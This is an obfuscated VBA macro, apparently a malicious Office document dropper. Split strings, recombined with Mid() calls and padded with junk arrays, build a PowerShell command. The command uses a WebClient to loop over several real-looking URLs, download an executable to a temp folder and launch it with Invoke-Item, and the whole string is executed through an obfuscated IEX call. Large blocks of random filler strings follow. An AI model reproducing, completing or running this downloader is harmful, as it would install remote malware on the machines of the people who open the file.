FzOwbwcGUXm = "PkAGX6VzsVcb'+'vVcb+Vcbuau/Vcb+Vcb,htVcb+Vcbtw4K+w4Kp:Vcb+Vcb/Vcb+Vcb/www.onesVcb+Vcbo'+'urcw4K+w4KewinVcb+Vcbdow.com/QTVcb+w4K+w4KVcbpw4K+w4KGf/Vcb+Vcb,httpVcLSKoz5k"
INUJTIw = Array("mopkNaWE", "LQLzKiIp", "LUucjZsm", "TbTPfqkX", "vzptJluK", "azwbIIlF", "zRESZNbM", "wCRmHGZV")
VkqrwXN = Mid(FzOwbwcGUXm, 10, 150)
jLOJw = Array("NqwvzQwO", "sVYwLkiu", "rSnCiSGq", "oidfYkjk", "HaXDXmGW", "qlHbiwWI", "lwDJrUGv", "jIHPmTpH")
OFoCcjrPXHc = "1T1Alfu2wEKVcb+VcbuVcb+Vcb/,httpw4K+w4KVcb+Vcb:/Vcb+Vcb/www.mVcb+Vcber'+'siw4K+w4KntVcb+Vcbz8bBCWV0IYjPznt"
CUajSrj = Array("LQhAArtE", "FXMfQPfT", "utohjRVj", "TlXsjXcl", "EzASsnhG", "NPvSdaFr", "NksqcuKu", "vwjPUAVh")
HDisaS = Mid(OFoCcjrPXHc, 12, 80)
hsiKilVRT = Array("hiHwULDP", "wicHaIVf", "rQjOLKcO", "uhcmoESL", "ZaHdmnLM", "CjtMiani", "wGUBqqGW", "GtEnjQbu")
XwVnCbo = "lFDTiBS Vcb+VcbZ1kbVcb+VcbcdVBjvzws"
tfDuFn = Array("ULGWMNjP", "RLbpMDpB", "PjBjrzzH", "bCIPUzYi", "QAVWDdrU", "wMtSEUkJ", "MvwlJtsU", "MzuKERuR")
uQGkao = Mid(XwVnCbo, 8, 22)
FLViq = Array("vFZHiCtq", "DiosINjw", "jfBUizsX", "LQliNTKd", "mlAVRRNp", "ttkpiKAE", "hdbKifJz", "MBwORKdk")
KzzQOKLFKjQ = "Fs4fjb1khuVcb+VcbasVcb+VJcYLKvsSsDjSJ6J2JAEDRrUdhF9W0"
ZnRpPHFmm = Array("YVdAmPuE", "ACVrZMCj", "VVFKEGUE", "YBJkOGHH", "YJjZAIjX", "OndikZid", "OnBcNPUR", "AYblFKpt")
GlQKmqYpUN = Mid(KzzQOKLFKjQ, 6, 19)
SuaaofMjoc = Array("SHNiBqLt", "WJanqwPu", "niHwpJRw", "KissUwlF", "KpKzAjdF", "bwjEudJW", "nJsikFRI", "pQUXwTZZ")
kTaXiMoDi = "2tEPRo4Q0dPXnCcMEr6z5GuuYoCvJkrbTT+Vcb+'+' Z1Vcb+VcbkkaraVcb+VcbpVcb+Vcbas + ZXq.eVcb+w4K+w4KVcbxeZXVcb+Vcbq;fVcb+Vcb'+'oVcb+Vcbreachw4K+w4KVcb+'+'Vcb(Z1Vcb+VcbMvjCF"
qNSVtjt = Array("EQFjBNAj", "sOTMAMmU", "tBcBslUj", "woAzvoPp", "LqzfUtBG", "pICTHuYP", "wiirSGIT", "wVnMNBlD")
bzIFz = Mid(kTaXiMoDi, 35, 126)
WZzWR = Array("QrTtwwsz", "ikTPnPpl", "bJWEjrPi", "uWEwrhjC", "KDNbkuQH", "kTrDwZdD", "UqpviaHY", "bkzbsvHA")
tGGOPcNEN = "S0wF24) ) ')  -REPlaCe([char]100+[char]66+[char]69),[char]36 -cREplACe([char]119+[char]52+[ji1WSI"
RLpvzMci = Array("pMjzFrzu", "bLtwXvVd", "ukKWlliP", "NHhAUVNN", "ihCUpzdt", "QqGlfUpr", "pDzwDsbD", "hTlwJzZG")
HJEPHPL = Mid(tGGOPcNEN, 5, 87)
SAcYcijoQMz = Array("dZNjhAJC", "iJnYfZLK", "voEUsQmC", "CqTvnVUb", "ojTUKBMt", "bttrjYwj", "lQkizYTM", "mKhrjNPM")
TuvnI = "VVAMcihjswi2JZoQ+VcbkfVcb+Vcbranc.DVcb+VcboVcb+VcbwVcb+VcbnloaVcb+VcbdFiVcb+VcblVcb+VcbeVcb+Vw'+'4K+w4cLR7ZQhiqjMCn"
DblqPjC = Array("zDIPRBUf", "NpQjqKzI", "AdlDlJSw", "irlhilod", "LoUFAqhj", "qnDqCuYB", "WCwfmzBn", "kMjZPnwc")
scjEzTpnkC = Mid(TuvnI, 17, 86)
iISsz = Array("jodiFlrS", "rXAYbXzY", "azmSwRcH", "SFcTPFZz", "PMGzDukz", "BObRIJFw", "iLTQfTiO", "MVLzJXDm")
BDljZrKR = "tuQZLNkEu3VNE0OB4VsbaVcb+Vcbks'+'iVcb+Vcb'+'mVcb+Vcb.Vcb+Vcbxyz/TwEmVcb+VcbAFErd/,http:/Vcb+Vcb/www.skVcb+Vcbw4K+w4KnVcb'+'+VcbshopVw4K+w4Kcb+VcbpiVcbw4K+w4K+VcbngVcb+Vcb.Vcb+VcbcVcb+Vcbom/Vcb+VcbTPkwVcb+KKuiVnuI0o5NG"
fzJdtScVoaT = Array("fKIcPvnv", "pirriivt", "fkTippbF", "KrvRKijP", "WiOUjpVt", "rPYUruYz", "kzIXrJip", "jCSXzWlG")
BcwjTv = Mid(BDljZrKR, 21, 184)
jzBRko = Array("nJGimcSw", "YilzZJYk", "wLURBkba", "lwVIIADa", "owudwDWq", "ZKGtfsSl", "oiLNzilC", "hftnHKnX")
ZrHWiF = "4MahfYdWIuwUMIimn1YNshkVcb+Vcbaw4K+w4Kbc Vcb+VcbinkjPwiPu1ko"
QOUKAV = Array("EGFKXpfb", "NFIcENwM", "KMBhqliE", "UtPULEzm", "KGNATVaa", "VTTioulZ", "wAjdXYpS", "cBpdZLPJ")
zbiCd = Mid(ZrHWiF, 23, 28)
DHwff = Array("jSvzhAqp", "QXUHDHss", "AItUsqfD", "mqJRjkTN", "BskCMZvn", "LPmSHZjz", "PBuhjzXq", "nsNqqZFf")
jzjcYIasuKw = "A5APnsadw4K+w4KaVcb+VcbsdVcb+Vcb Vcb+Vcb= nVcb+VcbeVcb+Vc'+'bw-objecVcb+Vcbt Vcb+Vc'+'braVcb+VcbndoVcb+VcbPVZij"
jnfNQYaHj = Array("sbvZwOAC", "zrzZzECQ", "VYndMDhq", "pLffHCBO", "saZXMmot", "fGdFvnLb", "QTaOPjho", "tEkmiUuv")
jGBbW = Mid(jzjcYIasuKw, 6, 101)
YqpCwiNlmCd = Array("aBTIdzwT", "PWFicTZz", "uwfPbRVA", "XhLvJVii", "jCVLwswo", "RCTRwHMn", "HjJawtNJ", "fTkwmCJt")
YPJdJaS = "hrjL11kbVcb+VwHcf5wv"
kZZtt = Array("sFWMqijB", "EWjpIbWc", "XXtwitTB", "ijMtqLVd", "YUkcPfOJ", "iUmcicuH", "SCYhPEUw", "mUhHVpKt")
dBOSHjtzdz = Mid(YPJdJaS, 6, 9)
vkaDjvlh = Array("jntsLivL", "GcYiJddR", "XLzUPjEF", "NPdlKEkS", "MwmvhVGa", "naXdilrF", "rNWqzLRC", "ioivFJBC")
uMBndR = "6rJIDTHM5dnwmbhWMKcb(Vw4K+w4Kcb+Vc'+'bZ1Vcb+VcbkVcb+VcbaVcb+Vcbbc.ToVcb+VcbStVcb+Vcbring(Vcb+Vcb),Vcb+Vcb '+'Z1khuasVcb+Vcb);Invoke-Item(Vcb+VcbZ1Vcb+VcbkVcb+VcENB"
USIwRKGvzU = Array("idUpwZoS", "OsbIsNSl", "OjCYELzI", "OJCqAdwQ", "RFdsjJIo", "GruiAChr", "wqoaXsUX", "dLbpXwRl")
YbiqcrOr = Mid(uMBndR, 18, 143)
EXGDK = Array("wiCOPupj", "mCzFOihs", "uuwRqWZo", "mNnQSNUW", "lYjHEcfD", "piiLWAzG", "OuJJWcKZ", "EOcCHZQZ")
jCSnpBwsGY = "kdDa+VcbqVcb+Vcbhttp:/Vcb+Vcb/wwX0UXYYHbJSiVlinBpYwSz2QBR1w"
EBcMMZPkoP = Array("KUtUVjJA", "kjDZwWfV", "BncTAIkH", "wXNvErpI", "sjXQzmNk", "PcTlBZri", "sYdIdTaB", "klWwTNvs")
RJzCtVCvq = Mid(jCSnpBwsGY, 5, 28)
QXWnimcEckE = Array("wIoHmSAj", "EWXFSjwc", "zGRSFFEQ", "MIWusdMC", "MzNRTzVk", "OjHhlqHj", "RZdESEzq", "EXuivFna")
dfGLAN = "HQKSbwkaCizd+w4Ksage;}V'+'cb+Vcb}Vcb'+')-rEplACE  VcbZ1kVcb,[w4K+w4KcHA'+'r]36 -rEplACE ([cHAr]48+[cHAr'+']119+[cHArw4K+w4K]w4K+w4KIf8Z7Bc"
uaHFWUc = Array("dqlbkvrK", "MCzjlFjS", "WWoIlGKi", "HMDnjLVa", "ZBHtskkD", "PKcbhiMF", "szwlEjFX", "fDTXsEiB")
NzTHzMCCPQk = Mid(dfGLAN, 13, 119)
QLPAQAmVCwb = Array("aCqOEAiE", "wYfAwuJD", "IthSvdrR", "wjrmPFvo", "PXKNMwhi", "SOrlkdMU", "wGUpijPz", "KZSVIspq")
zjvnU = "u8XCi7osR1ACHbon.cVcb+Vcbom/HVcb+VcbOB'+'Vcb+VcbwSS9aaEA"
MWrwzTMp = Array("GQHKIDjA", "JfYrNirv", "kCGUYatt", "rlVVYQSO", "QHPahCtE", "lVzQaquE", "VWGncOXj", "XOTXiOcs")
NZCEDJVjd = Mid(zjvnU, 14, 37)
mHSKKrqiRC = Array("ZivDotzX", "qoGzkCGS", "rRnWqRAi", "lzDNpuhp", "rZtDiqIH", "zwDWrpMB", "HUWHwwiI", "iMRrpjiw")
HEpIuk = "IiuvoVcb+VcbaVcb+w4K+w4KVcbt.Vw4K+w4Kcb+VcbsVcb'+'+Vcbe/MthVcb+Vcbh/ZVcb+V'+'cbXVcb+Vcbq.w4KHnSmW5FL5w"
DwjapBVBU = Array("CjQGQFEw", "pbhJOold", "ijnHHopm", "uTNQjNnm", "uXQzdiww", "EFOwCoMP", "IVYbHdLN", "riMzsoNc")
kOWHmfO = Mid(HEpIuk, 5, 88)
PJRztIFDGS = Array("jMLWaBlB", "buunwKXO", "iJWPoEIR", "XTtpQJsN", "XsuRJhUv", "hfpTjukM", "BIBDXkwb", "EtwGHvlS")
EojGRiuK = "Zo18QmL4K+'+'w4KMbjcvdn"
zMwSh = Array("qXlNmFCQ", "wmkCWnlf", "WrVOQdaI", "izjjJGjX", "MDFjhvNA", "ZpTIpaGR", "iJjsifTN", "zcimZTHs")
ZEWmJ = Mid(EojGRiuK, 8, 9)
iBLIcYaR = Array("noJolbfk", "GlsUUPrC", "PKFLIKjs", "wfrcqWuV", "iGclzwMS", "aGnvGSIA", "GbFRuZcd", "FQpGjDuj")
TpGsLwO = "fdl2PsjNsKrALXNdEHElF6char]75),[char]39) | . ( $PshoME[21]+$psHoMe[30]+'X')P2JW30PvJNt2Wqj"
fKqJqGpMn = Array("QXUPHmvU", "piVrlBIz", "GGJSrBTL", "rrJfqwbT", "rrXvmVof", "sjUSMiqu", "JfOiifvO", "DJYQdPis")
pkPQOqlQDmd = Mid(TpGsLwO, 23, 53)
hDTck = Array("tktiNsTE", "fboObbrt", "oGvhjQpa", "FrDbGsLR", "tMUEwURQ", "LpioSHlw", "RoBJzhVc", "vSdVorzn")
bBDVrT = "j4K+w4Kcb+VcbnVcb+VcbeVc'+'b+Vcbw4K+w4Kw-oVcb+VcbbVcb'+'+Vcbject Vcb+VcbSystV'+'cb+Vcbem.Vw4K+w4Kcb+VcbNetVcb+Vcb.WebVcb+Vc'+'bClient;Z1knoY2jL0w56zh6AboECO0"
cXtvbq = Array("zCNHGzfz", "UzJwYPFL", "bLLJErYq", "lozGppbm", "EOVasXci", "ItORqmOw", "SbCiiwzH", "dXWRAZJi")
BldRBbN = Mid(bBDVrT, 2, 137)
TavRUM = Array("cwHEkoiE", "wZpEdhHK", "bnTmJokj", "RGurwwan", "qWbJicTV", "cKPUdGfi", "fosiOAkn", "LYnduqGB")
srcFRSfMG = hsOHJmcuT + KMuZRpKPw + Chr(34) + CZuwSzHjZa + BldRBbN + jGBbW + hbLFAKjwjzY + dBOSHjtzdz + ZEWmJ + fPrGpRK + jMHdbG + RJzCtVCvq + NFEsiXmfjD + NZCEDJVjd + HDisaS + BcwjTv + VkqrwXN + UVWLosYt + kOWHmfO + rnlRCkNCmkX + djBdZqRS + GlQKmqYpUN + WJMElw + bzIFz + zbiCd + uQGkao + KUHWizQTvHZ + scjEzTpnkC + YbiqcrOr + aUTSnsWWkA + sRLmnjw + XnDhRj + NzTHzMCCPQk + LikuRkj + iMqGX + HJEPHPL + pkPQOqlQDmd

qDQHpBj = "ikDPXHGSbtMhHVzAFptGLfibzdSiwnrRBFKUFJuZEcJlJpQXzlpBjKaNwGAZGNWoBvfBKfuwvTBjVzSINCo94Y1Zc43oS4C"
bJCWkTK = Array("PUvijPNR", "kPTQoMhi", "AfsHbtFK", "GXQYBEEv", "EUzwSBnF", "tVzcviCD", "zTGzDMhW", "OkXJwoPf")
Pjizp = Mid(qDQHpBj, 8, 74)
zkTvHhJkpfi = Array("JqfzmcIi", "XrQUfuvR", "UwwKoSaz", "vjzMOObw", "ZBNjECLh", "qYdNSNjU", "UHmirOuq", "QfBGcvTJ")
iwblmbScQwR = "PzhGbbCAphjzjYZRqDwGlNOflNVwGTpHPHCBiBfJnfjh82wqb1uTjAm6iCkPmGYcrKXNn91w1PoTmw"
jFHKFO = Array("zKCIsAkH", "UjwnHqVt", "LlXdQLwD", "TXbzzjad", "NrDrouMa", "mcjmnlEa", "HBkRlKFm", "LwpUZnIn")
LsZrEJt = Mid(iwblmbScQwR, 2, 42)
jMMcoOIw = Array("jHAfKsIn", "XMfqAbsL", "CwMjoUrX", "kOqzzBOU", "osjraucd", "mBNBCqDF", "bWkDWkZL", "QdvvCJnW")
CFWwzhWs = "WWi3NGbwHUNuiXBWrAIvGfOwOrnkuNiNrmcuEjIqkWSuwhVqCcHjIYzDDkYNjaWvbADsvGRIsRLjNUCjWziSFL0fkIniq2n38c9ACiFi84BibEVc"
UXtQR = Array("jTVDKKXc", "OVLSRRzq", "wTFEBPat", "XYjnARiG", "HPDpsiOa", "knCmDXCZ", "KmCkZMuR", "tcflbjbz")
PkGhWcZhinD = Mid(CFWwzhWs, 11, 75)
cSdkDVKXT = Array("vsTjhvVd", "NMBdQDlU", "GjHzqcBJ", "EjsqMRfh", "HNsazdSm", "mYLkJOhY", "kIPQHOpT", "qKcADfRw")
MUdOPi = "2FYLmsBhHPQWtkKKbUIKfrYOjhkVHUrzDKNJkJJWWrZXKJhLAPQQrLqaqFcFIjamXTSiXBaSKlnnRAEZzYUrEbFrTmSijDOqRmArrwowozGFYDIqADFjLiiwNbOkjvlGWwWfANiBkVCGUzTQibidwfiiDDdPjDPtMzjbjdqnVEzqfbbNHzCT0nfa"
zdCvr = Array("qQQQYYKk", "ZjdTNSJT", "rrfaqQGP", "mOFYLpiw", "qHnYmELr", "iKzSVwmE", "vSkYMcVa", "KBdKTmYk")
FKbwoKORwH = Mid(MUdOPi, 4, 174)
qhnIJ = Array("jRCHoroW", "zcYfSmAo", "hqiUMhvz", "WMbvTkmI", "OCNbdwRu", "qtUdoCUk", "PsuWCzPz", "WFlcPsCM")
QljsOjWd = "HRifLRYkw3qMkOFoJCisCHdukXYDTAEaHpkEHHDZEjwOs"
woqZhdi = Array("iUTzHoCE", "uWXjOshH", "cRPnvGTO", "BwcDdjzv", "CXODGmXw", "WHlwAjvS", "IQjoEwXX", "AEzKLwbK")
ulYsMwjzKS = Mid(QljsOjWd, 11, 29)
ljwvOOz = Array("QwvFaDXv", "bRIFNOcw", "FqcnSFlF", "hOwCLHno", "mOHotBwF", "QmqsXZlf", "nYLjUYMK", "LqYMGUkT")
MaGcjb = "5X2GMlBFDFpaNzffhPAszadzkcvDlAdjiabYuiidVOaiqkWtwCSQRSBUuFJuUfjdsOcnVGlwlXWjzwJzGBFjhMOPZHioZjHnsvEHm4qhBbPdUrS00"
WlNpCRc = Array("LiQCvoph", "mIGqFiwN", "QHimBzdD", "kOKldDBQ", "dJdolulK", "kRRfhmow", "rQRtLwUL", "ANRjdEEj")
bcoroz = Mid(MaGcjb, 13, 82)
uKOcLJbhJ = Array("itHuuoTw", "WPvHPDZQ", "oXKNDkTR", "QNodNADR", "rNIlbHkC", "HMfoSCzh", "wawEnnct", "aqihAqjW")
lrbhlDFlP = "iOPtdtSvMVGjwSOwCHmGTIjZhAshSomTIcnjFrGlMWjvjWiIDzaQQzKUocPwjGzFAhaWiiqLBAuwblqKWjiVNWDLRTudbJntwWSwkWoTK9uE"
oXOqEL = Array("BmmcGNsK", "JRTaVWBf", "JjuhTZNY", "pmXKQatH", "ZswhTnRi", "KkcGMrwi", "AismpQlc", "YOmUqhti")
BShBjwsDrvt = Mid(lrbhlDFlP, 12, 83)
QFPEwQMuc = Array("mWXzadai", "RMXqjMlE", "olfLwSVV", "lYHqkNKl", "EHGYMicO", "rYzwUGPY", "vCulXjST", "BBNBVkwE")
zjicdjLQit = "83bwKjwXMkPEXzXiDzPJi8Lw3b2mkzfQcBsEiDAlvjrdhAjSKwuXFtXPjUdVvKmirG"
UKzNiAbolPz = Array("FwIljPvL", "BNaDmMfB", "lzYlhGMr", "wjMvSkii", "vSoCitZM", "TGPqjzma", "jIWHhjIw", "kRpwCAsQ")
XkGFpCS = Mid(zjicdjLQit, 33, 30)
kiWhsTpc = Array("UtsCYMFS", "odMKlpPF", "osDKRuGi", "sREAAwXP", "BzIAJdrp", "jNItzqfF", "bPRQDKDZ", "nOKHHFRq")
mSwIF = "9650OdvbdJSqlrUJilCUOFFtWsZkYWXioYpSGjzBpmsnndDQuwTQjhREhlKVELDHmkBNBCDClAfbMSFtoIpZCGBHHlkUWizdjlADbqOsvRijBprPfRjvWdEfitGQRifHDBsbSCoDIQCSDtZjd0NNs"
pvHLZ = Array("JirJIjGT", "zQXGOvRa", "tOGZRppP", "NKwoRwIi", "AMYjdDPI", "chHhEOtX", "PWLSwwAU", "sbvwnSCA")
vLcDUq = Mid(mSwIF, 5, 130)
AwUot = Array("CwMsKUEi", "lFUisbAb", "iDFLctif", "vGnzISwm", "rjSQVODp", "oViiOUMY", "siAHzbVI", "ThzEhFVS")
dEmiCrEp = "E5KlpfiTOo2Bm0GnokAQHqMimCqDlzRBKzcTsBvtMCmHKGTjGBwckdztZFGYjdkHNnmJUGLDCGEFDEXfiGzjhjHa4fap"
bZjcjzrAhr = Array("OpjlLskE", "ASGYQQlz", "LqIFjjWP", "kDpifakT", "mBkwNKJE", "LwuqPbEG", "vhPtdRJi", "SRAIDFZa")
OXGsmkQbb = Mid(dEmiCrEp, 19, 66)
joMqltKwKF = Array("cnFaivqY", "XuUTWjEv", "RCmLiHQX", "tHLFAiff", "mlYMLMBU", "FJqzmtvU", "zvBvIWAV", "WhhbklXp")
wtVrSlqPow = "WcACLVPfWNiLLIY5VWqWTG4fv4XfKGKBEvzrBmtVWhifzWLFNKzLIfYBrZkBQndiuDmUbfKRtzjidlfMmhSAJztYWwAsO3vzpY"
ohnaWzqEB = Array("iAYAuOGv", "civqUlXk", "EBDOpcqB", "oAavDHEd", "JCRYvMkG", "wOqibzBV", "tfCordTB", "JXLtoKsV")
SGwSbipF = Mid(wtVrSlqPow, 28, 64)
cliBzwI = Array("CpMVYWTJ", "JbDwfRwS", "QrdTrjhv", "EQjYSzwD", "YiXiMUOu", "YALwYTMi", "UEKTNXpW", "HRQHqurJ")
BvHINZ = "54HKithllJNFGUfGtFRjwviaJcGtKAwUUSwhYDWzAZtqUXjdBACdCzfhGjBCnoalKsknXwhqiUjXCsGlscsKzVRVmPbrBUKMzHfbnwFCSMuiSIiOaPJLwPnoaOAIXpoOKUYuMfwwWpslTpkKK7czisnRwX"
bojthj = Array("zHazciDB", "dtiTCiOf", "ToiEpojE", "SRnjjNus", "KYCfzVMz", "qErwjJvS", "ojFzXNRI", "YWfLvURP")
EEjRfi = Mid(BvHINZ, 3, 138)
hnCbUEX = Array("fcFRLQXQ", "DHhttrTq", "zQadwifB", "DmcQwvJZ", "SwOkmwmh", "wdjAnYTo", "htFUqOdz", "zDOYnGSH")
kGCmoUTc = "48ZAF9cW3TLGCrbPHOHzcoSLGEWOwizSIcQXJzUjzGwQHKDlsBOiwWhzrqmYuoaQttzaaDGJuXzVrCEvAlWuQTVmuRfSLvpIjfXONdKovEjYWLHplqYJSfAZXKfJXnzwiqpMiqiWahwLjwQjJqhVXfqAizqCwBQIHkqfVvKvHBikjppauwL0"
RdVkz = Array("KFAbYtus", "XzEcjKCO", "NtizKXNM", "jGIBoChw", "ZcbMGENS", "BGijjnVm", "bmhBnKJm", "snvRlsDU")
rdnfLhh = Mid(kGCmoUTc, 11, 168)
jKjElYlLCOv = Array("fszVoZHE", "dozAXjzb", "iVZTLdvU", "UtipuJiu", "AvIFjpzb", "OjwlSGjl", "LvwGhoPB", "wiAuuRJT")
qlIwjPUvnY = "ARnfM206Mdr7wbjCikMRlKwPjUqAYvwfdYfXwkjCvRNoGXBNrMWXKYCELEoaViaAZJPMwLDtBKWUzKJMTdJLZZVEVbMuwJjQqMOzHpRfIdWzBhHBvbGrVObAoKqUzJwsWGukGdi7hQ"
iUzbHLtmrw = Array("YjYYkjMT", "EzOEVNXL", "HMOKFCFj", "SjWAKYmj", "XnEtiChD", "JkKliPrm", "iAWLvdEW", "drFAKLIf")
jEiFWn = Mid(qlIwjPUvnY, 14, 115)
ovdbIwMuT = Array("ipCaLAIU", "SpYwKhDO", "qGHHQRqA", "OhdwjJQo", "YlwWCXCK", "tLwddCaR", "jVDOisTM", "zBMdXKnJ")
zDvrwCiJi = "XtMYPqzHDfTcZWirYzZWRURcvBrSMRqtNwhMQEvdAhCzOPdluCLXzjBjmwMotmvpNaPdpWaTEvVkRSNfXGXJFSthuAZSsGkOlMmnAAvYbsTDKROUkjQnOlkujhiowIazLGwEjaiXKwhNzpWcmFhLqwzAcrHSRGcTRVsDTJoKCscQDWvq8cdvwmwGNTN8T2DV3K80d"
JfaBahHN = Array("jQZOkrKl", "qMLAwpTJ", "FRZKfdiw", "ISjXFOpH", "wRjsSYFd", "olRjBYBD", "wCviAOXF", "mdFRLnfc")
znhJTm = Mid(zDvrwCiJi, 11, 166)
LdioG = Array("SCtNtDUj", "GVqkvCRA", "DGwtZSJc", "BsHuJDmZ", "KhSZpRPl", "hYUTJsmp", "VzXIvNYz", "tRLBwaZC")
FwONaEGZH = "IO70MlrSCUbtUOtabSiLlnFcauUNcYBiOSRjrzzEtzYhiMLtzNCNoqUmubJWnEqiSsiBzJjcSdRlPXwNiaOOVouYzfoPpcRpJtPliJwpiauKYjWWdwoMpbIiwFDSUTmqMccVIMfZiZkvtjAOIRltoEzilkncGiUKnDwvGBORQPhQfj2bZ3zuvTnmLNW4p6V8GTV2TBi"
BqfGAOk = Array("zhCBYVbN", "GUrkhZtX", "iEiJbwPk", "GkniiZpw", "lqOBEQYE", "vizaYBKJ", "QUAsfHjw", "SRunizjh")
WaFYn = Mid(FwONaEGZH, 8, 165)
jGpFiciOZQC = Array("cVoWiwOz", "fBsDtBrQ", "kPGwnkmd", "iAAEjUDK", "AscWpWIm", "GCCMjHRw", "ZWsEuQls", "jKsiwKRL")
qnJVkIsH = "kGYOJWj2i3sujKzqirizVzJUSrGVjOJONTqtGPIrsBosMMdLqLNnWNKvnaAKcAODwzhQTEjSjnEULQIGVRzbdsom"
KouIdzdv = Array("XlDTJJkF", "XLwOrSEt", "RcwVbQXb", "rNYEmEkM", "lzYfMcLZ", "iWdnNKwk", "bhNJaBAG", "ObcvlfSS")
MjDIlhAmP = Mid(qnJVkIsH, 12, 69)
IkSHK = Array("EQBktjEG", "foHrkKlV", "SGhiWQOV", "JOzjjDRV", "nQBbkNjW", "jHZvRQwU", "jOcBwMZn", "CfbilXWb")
ZfQZTszM = "8JhZTfIpJ8wmWcsV3A3oVKkzikM87tnvWKjRfuXTKPzqsZiYtqUhapdfBGYMZE"
rbiEMUobYuD = Array("dzksLIHD", "fzJTtRic", "uGUPhajz", "ajUkCvMk", "LNzNXZIL", "lcpbawwf", "jNQHrqDD", "QkSioXAj")
APBIuPwHIL = Mid(ZfQZTszM, 30, 30)
joMZV = Array("hsAbXnzN", "wZDTihZC", "wmXEksvp", "kMZnINvF", "jqWRutHa", "vRwdKHRT", "TsfVYjQp", "zKqLNLFk")
KrRrKrbz = "uwQXiDXLoPIjjhLcwZjiYEUwPYYjnajawLarkzVWRPTOLuEGcTz9pjfSpMzjSFMsnQKvfT1Ol"
XzhMKEp = Array("wrCEPMqp", "nmSGzQlj", "czYnzHzl", "GjZKMumN", "GnjnSiGQ", "SDzEdiPG", "ZvZBOimp", "tQwinfct")
nbMTHJtIkc = Mid(KrRrKrbz, 2, 42)
kEiosKrrCt = Array("mQciOXoS", "bpjjvKIM", "dkbSiXuQ", "BMVCwqsp", "hqvvWowo", "AcYdiVjV", "dIskrvkO", "WLcCBmWk")
LfSWNvu = "ZB5Zuu62wXCl8IfocCJAobikFdaRtdXCEicVCwwYnRunBp5zHh"
ZwjQwLpUdb = Array("lOhpRiiq", "iTmDmFmz", "CJkoBOBE", "YHlVvNKa", "hFzOwwui", "VnbzUKhl", "ScvGLhQX", "MdRJwMvU")
uVzJIj = Mid(LfSWNvu, 18, 28)
uuGzb = Array("ijTHojwN", "wJjsctLH", "NusKHJrO", "fpUBsfXU", "LmcdZXMZ", "XDWlcjmL", "QDdJTGOU", "rEbwPwVR")
tAURwdJUp = "6mTjLJidikcN6uzvswiBpQjzitooIC9VBz"
vikKObUUc = Array("kuOAKjGp", "qJwrLwcf", "tUjATstP", "jTuYcaDZ", "rMQrLrjD", "AtptBlOM", "fvjuVSzr", "AwQqmiNP")
lmrqp = Mid(tAURwdJUp, 20, 6)
FDKbfdzoli = Array("PJWjLbYZ", "TIqcNFlm", "tqcbBpzO", "FlMTHDYw", "OMuFfDAS", "iJdAmZsr", "jGjfDwca", "KHbZOFSQ")
UPNKKiORt = "IidWFGXbuBwHiYGOPPDNtDlEawbdriiPEKjNjrvnYAqoOOFFPzGoHEarrXjIiujPXjDTptiXTPotNwpLrWOsXqHAksVMHnIiRaRiLlQWUiUrPjiuhXRIfqrhYCizXRPjGKbmfHAFFsXpVQlDNafkVAzaikJIDTwCSolFErPZjpwWzr9fSmZmDD9L3zrB8C6"
vttoEW = Array("zmKuoUNb", "DbFJKnXw", "tEpnAwop", "OXiikNbA", "jWtovARz", "duwDKjrQ", "YbfUOXiw", "wUjQmfrq")
ZFvpTE = Mid(UPNKKiORt, 5, 164)
nlRhsfLw = Array("PjtdNjNq", "CwFPCOGr", "lqcJEMdw", "EoKJfXBT", "FIZldJmA", "EuBqbFvF", "UrWCfPtC", "DvZZZDLf")
DjSkMDXFj = "7JrJicRajuNtaoRwtwdlcVFRtVoFzBHFhUVikwbNlXcAzPzdAhCaASDMnoWvtaJCunuzjiOvUQzEsFUiYLFPzjFORIuvbjTLNaGJVAwRTGGjTwTiTsWiUuDNhffYnSUnwnqSwKIYOnwsaVvSoMbiJlqTXtcpUXdAlSmfHBjJkzThzKmLkMkaqldLwXvFiSEqJvGIjPKndSwMRJVMGQEHnYNvLGTAJPi"
iFQScRS = Array("WnhdPvwp", "vWmGUdXn", "phjiUhGI", "YPVpPIcG", "nAdKfqqU", "jNUUSPNE", "JEiEtrDp", "jYFzZGan")
fZqcBZ = Mid(DjSkMDXFj, 15, 199)
nlnBwfS = Array("bLCrhZVc", "vUkvYMwT", "wclSPtdV", "AJnvHXzw", "OvzCWGjP", "jIYAzMUF", "PcCPqFWi", "hjrXmZVY")
MCzpiXciuHD = "7ZPBSXGJlMXIfwVoYKALXqztJPmHFsYGVhjDQYWANBdnSkuhDFSKhPRmhIwIkwEtnRnwPRYzoAzWNKaYVEEAaOZFPuVIbNPPzjzAzvSlhTVhRvYXhYnjtDTYrhjVwQXbkhZdUqOzYivbA7SSvrojVK"
iIhEVf = Array("XTSzQhYR", "ArFIrJWz", "uiDwvNRA", "Hkwijcww", "zaShENWn", "wjwmRznO", "aOLzkqZK", "CRqfltiY")
MkumvL = Mid(MCzpiXciuHD, 6, 127)
JzMzJzwqTA = Array("RYUjLCMK", "NkOpKjCA", "MjXpumzX", "UFUYVtNu", "XMPVbvij", "kmupBWKm", "VWwzdWFf", "YzLGiooU")
RadGVdpsSbT = "QrXLDnSCLIRijzmmZ4hwlJzYl10u904wYz1tcoPQA1auHdLRz"
jtzrqHUwB = Array("qjUrhXwD", "TAjAFrYw", "PBwkQZRz", "FuMQnCoV", "qWhdAsbP", "aTjwpLIp", "FWVQrjGQ", "RWlmKjQR")
VlfLmnvDEH = Mid(RadGVdpsSbT, 3, 13)
WTsNH = Array("MvQnkbXa", "KSzmKpRr", "MHGpIzOl", "SzJiIncQ", "SSIuuInG", "JItXNUkI", "mXXCwVMN", "hiUlRoRW")
uKmkSAIbGJ = "LtLT1wkufAIpdXmJFzFToYrUKuJJAWSwicuvKwoqMNqjisrjsDpdvjDXPwzzHCiqBFBtCmHGJPGaiHlSDaQzhoAvZWjOBriKizhcqzjGwiUjccpLI"
jFDVtzI = Array("WoAdkiso", "uiPBUBwc", "sjlujIwf", "GWQYJmCH", "itARDcfj", "TOaanwrp", "tQnBGNTN", "qVXOOTfH")
dPtlE = Mid(uKmkSAIbGJ, 18, 94)
wwrPQ = Array("cPuYfisN", "qzshhSmH", "qNPOoRYD", "jwwAGndD", "hEhHOBTk", "zmzWGDGP", "OLDUFCzL", "rqsjisHD")
jLqjnhEzGct = "oOkovniuT3zoXQhCXntIKabZlSSHtsoUVzaDZiVtQbJQMzpRvuwjVvNHwNublMfzsPzwpTBBMjNjQLNocALwwEwakTHLouHEvJXwwrccsuXphiqkAGwkBjDnQYOVLpNSYJnGoQqlYjFBhJsFdXLhvXDOGjjZdGQChFQYqjwjPNLRbBGGfIsoifWBFZzEjQISio"
